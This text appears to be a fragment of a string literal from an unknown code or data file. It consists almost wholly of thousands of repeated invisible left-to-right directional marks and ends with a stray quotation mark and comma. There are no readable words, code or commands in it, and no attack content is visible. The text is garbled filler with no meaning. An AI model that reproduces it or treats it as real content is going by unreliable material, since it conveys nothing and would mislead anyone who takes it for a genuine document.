‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎",
